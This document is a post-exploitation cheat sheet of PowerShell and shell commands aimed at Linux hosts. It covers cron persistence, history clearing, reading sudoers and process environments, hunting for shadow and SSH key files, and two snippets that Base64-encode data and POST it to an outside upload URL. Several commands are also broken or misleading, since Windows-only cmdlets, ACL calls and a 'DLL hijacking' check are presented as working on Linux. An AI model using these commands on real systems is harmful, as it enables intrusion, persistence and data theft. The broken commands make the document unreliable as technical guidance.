# PowerShell Post-Exploitation Commands for Linux

## Establishing Persistence
**Command:**
```
crontab -e
* * * * * /usr/bin/pwsh /path/to/persistence.ps1
```
**Description:** Edits the crontab to schedule a PowerShell script (e.g., `persistence.ps1`) to run every minute, establishing persistence on the system.
**Example:** Set up a cron job to execute `/usr/bin/pwsh /home/user/persistence.ps1` every minute.

## Privilege Escalation - Check Elevated Processes
**Script/Command:**
```
Get-Process | Where-Object { $_.Elevated -eq $true } | Select-Object ProcessName, UserName
```
**Description:** Identifies processes running with elevated privileges, aiding in spotting potential targets for privilege escalation.
**Example:** List all elevated processes and their usernames on the current Linux system.

## Enumerating Users and Groups
**Script/Command:**
```
Get-LocalUser | ForEach-Object {
    $user = $_
    $groups = Get-LocalGroup -Member $user.Name | Select-Object -ExpandProperty Name
    "$($user.Name) : $($groups -join ', ')"
}
```
**Description:** Retrieves a list of local users and their associated group memberships for reconnaissance.
**Example:** Enumerate all users and their groups on the Linux system.

## Network Enumeration - Get IP Addresses
**Script/Command:**
```
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength
```
**Description:** Lists network interfaces and their IP configurations, useful for network reconnaissance.
**Example:** Display network interface details including IP addresses and prefix lengths.

## Network Enumeration - Capture IP Info
**Script/Command:**
```
Invoke-Expression -Command "ip addr show"
```
**Description:** Executes the `ip addr show` command to capture detailed IP address information from the Linux system.
**Example:** Retrieve IP configuration details using the native `ip` command via PowerShell.

## File and Directory Enumeration
**Script/Command:**
```
Get-ChildItem -Path /etc
```
**Description:** Lists files and directories in the specified path (e.g., `/etc`) for system exploration.
**Example:** Enumerate all files and directories in the `/etc` directory.

## Data Exfiltration
**Script/Command:**
```
$fileContent = Get-Content /path/to/sensitive-file.txt -Raw
$encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
Invoke-RestMethod -Uri "https://snowcapcyber.com/upload" -Method POST -Body $encodedContent
```
**Description:** Encodes a file’s content in Base64 and sends it to an external server for data exfiltration.
**Example:** Exfiltrate the content of `/home/user/sensitive-file.txt` to `https://snowcapcyber.com/upload`.

## Covering Tracks - Clear Bash History
**Script/Command:**
```
Clear-History
```
**Description:** Clears the Bash command history to remove traces of executed commands.
**Example:** Erase the current session’s command history on the Linux system.

## User Profiling - Get User Information
**Script/Command:**
```
Get-User -Name andrewblyth
```
**Description:** Retrieves detailed information (e.g., UID, GID, home directory) for a specific user (hypothetical cmdlet).
**Example:** Get details for the user `andrewblyth`.

## User Profiling - Get User Processes
**Script/Command:**
```
Get-Process | Where-Object { $_.UserName -eq "andrewblyth" }
```
**Description:** Lists processes running under a specific user for activity profiling.
**Example:** Display processes running as `andrewblyth`.

## User Profiling - Get Network Connections
**Script/Command:**
```
Get-NetTCPConnection -OwningUser "andrewblyth"
```
**Description:** Displays TCP connections owned by a specific user for network activity analysis.
**Example:** List TCP connections for `andrewblyth`.

## User Profiling - List User Files
**Script/Command:**
```
Get-ChildItem -Path /home/andrewblyth
```
**Description:** Lists files and directories in a user’s home directory for access profiling.
**Example:** Enumerate files in `/home/andrewblyth`.

## User Profiling - Get Installed Software
**Script/Command:**
```
Get-InstalledSoftware -User "andrewblyth"
```
**Description:** Retrieves a list of installed software for a specific user (hypothetical cmdlet).
**Example:** List software installed for `andrewblyth`.

## User Profiling - Get Recent Login Events
**Script/Command:**
```
Get-WinEvent -LogName auth.log -FilterXPath "*[System[(EventID=1) and EventData[Data[@Name='user']='$andrewblyth']]]" -MaxEvents 10
```
**Description:** Queries authentication logs for recent login events of a specific user (adapted for Linux logs).
**Example:** Retrieve the last 10 login events for `andrewblyth` from `auth.log`.

## User Profiling - Data Exfiltration (Hypothetical)
**Script/Command:**
```
$data = "SensitiveData"
$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
Invoke-WebRequest -Uri "https://snowcapcyber.com/upload.php" -Method POST -Body $encodedData
```
**Description:** Encodes and sends user-related data (e.g., `SensitiveData`) to an external server for exfiltration.
**Example:** Exfiltrate the string `SensitiveData` to `https://snowcapcyber.com/upload.php`.

## File Permissions - View Permissions
**Script/Command:**
```
Get-Acl /path/to/file.txt
```
**Description:** Retrieves the Access Control List (ACL) for a file, showing ownership and permissions.
**Example:** View permissions for `/home/user/file.txt`.

## File Permissions - Grant Permissions
**Script/Command:**
```
$filePath = "/path/to/file.txt"
$user = "andrewblyth"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "Read, Write", "Allow")
(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath
```
**Description:** Grants read and write permissions to a specified user on a file.
**Example:** Grant `andrewblyth` read/write access to `/home/user/file.txt`.

## File Permissions - Modify Permissions
**Script/Command:**
```
$filePath = "/path/to/file.sh"
$group = "developers"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($group, "ExecuteFile", "Allow")
(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath
```
**Description:** Adds execute permissions for a group on a file.
**Example:** Grant the `developers` group execute access to `/home/user/file.sh`.

## File Permissions - Revoke Permissions
**Script/Command:**
```
$filePath = "/path/to/data.txt"
$user = "alice"
$acl = Get-Acl $filePath
$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq "Write" }
$acl.RemoveAccessRule($rule) | Set-Acl $filePath
```
**Description:** Removes write permissions for a specified user from a file.
**Example:** Revoke write access for `alice` on `/home/user/data.txt`.

## File Permissions - Change Ownership
**Script/Command:**
```
$filePath = "/path/to/file.txt"
$newOwner = "andrewblyth"
(Get-Acl $filePath).SetOwner([System.Security.Principal.NTAccount]$newOwner) | Set-Acl $filePath
```
**Description:** Changes the ownership of a file to a specified user.
**Example:** Set `andrewblyth` as the owner of `/home/user/file.txt`.

## File Permissions - Check Effective Permissions
**Script/Command:**
```
$filePath = "/path/to/document.pdf"
$user = "guest"
(Get-Acl $filePath).Access | Where-Object { $_.IdentityReference -eq $user }
```
**Description:** Checks the effective permissions for a user on a file.
**Example:** Display effective permissions for `guest` on `/home/user/document.pdf`.

## File Permissions - Inherit Permissions
**Script/Command:**
```
$directoryPath = "/path/to/folder"
$acl = Get-Acl $directoryPath
$acl.SetAccessRuleProtection($false, $true)
Set-Acl $directoryPath $acl
```
**Description:** Configures a directory to inherit permissions from its parent.
**Example:** Enable permission inheritance for `/home/user/folder`.

## File Permissions - Check ACLs
**Script/Command:**
```
$filePath = "/path/to/data.txt"
(Get-Acl $filePath).Access
```
**Description:** Lists all Access Control Entries (ACEs) in a file’s ACL.
**Example:** Display all ACEs for `/home/user/data.txt`.

## Privilege Escalation - Check Current User
**Script/Command:**
```
whoami
```
**Description:** Displays the current user’s username to assess initial privileges.
**Example:** Check the current user on the Linux system.

## Privilege Escalation - Enumerate Local Groups
**Script/Command:**
```
Get-LocalGroup | ForEach-Object {
    $group = $_
    Write-Host "Group: $($group.Name)"
    Get-LocalGroupMember -Group $group.Name
}
```
**Description:** Enumerates local groups and their members to identify escalation targets.
**Example:** List all groups and their members on the system.

## Privilege Escalation - Check Sudo Configuration
**Script/Command:**
```
cat /etc/sudoers
```
**Description:** Views the sudoers file to identify users with elevated command privileges.
**Example:** Check sudo privileges configured in `/etc/sudoers`.

## Privilege Escalation - Check Executable Permissions
**Script/Command:**
```
Get-ChildItem -Path / -type f -executable | ForEach-Object {
    $file = $_
    Write-Host "Executable File: $($file.FullName)"
}
```
**Description:** Searches for executable files with potentially weak permissions for escalation.
**Example:** List all executable files system-wide.

## Privilege Escalation - Check Service Configurations
**Script/Command:**
```
Get-Service | ForEach-Object {
    $service = $_
    Write-Host "Service: $($service.DisplayName), StartType: $($service.StartType)"
}
```
**Description:** Lists services and their start types to identify misconfigured services.
**Example:** Display all services and their configurations.

## Privilege Escalation - List Cron Jobs
**Script/Command:**
```
crontab -l
```
**Description:** Displays the current user’s cron jobs for potential exploitation.
**Example:** View scheduled tasks for the current user.

## Privilege Escalation - Find World-Writable Directories
**Script/Command:**
```
Get-ChildItem -Path / -type d | Where-Object { $_.Attributes -match "OtherWrite" } | ForEach-Object {
    $dir = $_
    Write-Host "World-Writable Directory: $($dir.FullName)"
}
```
**Description:** Identifies directories with world-writable permissions for escalation opportunities.
**Example:** List all world-writable directories on the system.

## Privilege Escalation - Check DLL Hijacking
**Script/Command:**
```
Get-Process | ForEach-Object {
    $process = $_
    $dllPath = Join-Path $process.MainModule.FileName -ChildPath "evil.dll"
    if (-not (Test-Path $dllPath)) {
        Write-Host "Potential DLL hijacking found in $($process.ProcessName). Exploiting..."
    }
}
```
**Description:** Identifies processes vulnerable to DLL hijacking by checking for missing DLLs.
**Example:** Scan for DLL hijacking opportunities in running processes.

## Privilege Escalation - Search Password Files
**Script/Command:**
```
Get-ChildItem -Path / -type f -name "passwd*" -or -name "shadow" -or -name "sudoers" -or -name "id_rsa" -or -name "id_dsa" -or -name "*.key"
```
**Description:** Searches for files containing passwords or sensitive information.
**Example:** Find files like `passwd`, `shadow`, or `id_rsa` system-wide.

## Privilege Escalation - Check Wildcard Injection
**Script/Command:**
```
Get-ChildItem -Path / -include "*.log*" -Recurse
```
**Description:** Searches for files with `.log` patterns to identify wildcard injection vulnerabilities.
**Example:** List all files matching `.log*` recursively.

## Privilege Escalation - Find Setuid/Setgid Binaries
**Script/Command:**
```
find / -type f -perm /4000 -or -perm /2000 2>/dev/null
```
**Description:** Lists setuid and setgid binaries that can be exploited for privilege escalation.
**Example:** Identify setuid/setgid binaries across the filesystem.

## Privilege Escalation - Check Environment Variables
**Script/Command:**
```
Get-ChildItem -Path /proc/*/environ -type f | ForEach-Object {
    $envContents = Get-Content $_.FullName
    Write-Host "Environment Variables in $($_.FullName):"
    Write-Host $envContents
}
```
**Description:** Inspects environment variable files in `/proc` for potential exploitation.
**Example:** Display environment variables for all processes.
